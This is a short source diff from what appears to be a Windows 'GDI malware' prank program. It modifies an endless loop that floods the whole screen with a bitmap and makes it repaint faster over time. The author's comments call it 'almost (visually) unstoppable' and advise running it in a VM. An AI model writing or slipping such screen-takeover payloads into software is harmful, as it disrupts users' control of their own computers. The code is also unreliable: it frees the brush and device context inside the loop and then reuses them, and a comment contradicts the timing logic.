@@ -267,23 +267,27 @@ void WINAPI ded(LPVOID lpVoid) {
 void WINAPI REALded(LPVOID lpVoid) {
     // consider it as an ded v2
 
-    // basically fill the screen every 1 ms
+    // basically fill the screen every 0 ms
     // deadly, almost (visually) unstoppable
 
     // this is why you always showld use an an VM ;)
-    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"check.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
+    HBRUSH brush = CreatePatternBrush((HBITMAP)LoadImage(NULL, L"finale.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE));
 
     HANDLE thread;
     DWORD ID;
 
     RECT rect;
     HDC hdc = GetDC(0);
+
+    double bosta = 1.1;
     while (true) {
-        Sleep(1);
         GetWindowRect(GetDesktopWindow(), &rect);
         FillRect(hdc, &rect, brush);
         DeleteObject(brush);
         ReleaseDC(GetDesktopWindow(), hdc);
+        Sleep(4000/bosta);
+
+        bosta *= 1.01;
     }
 }
 
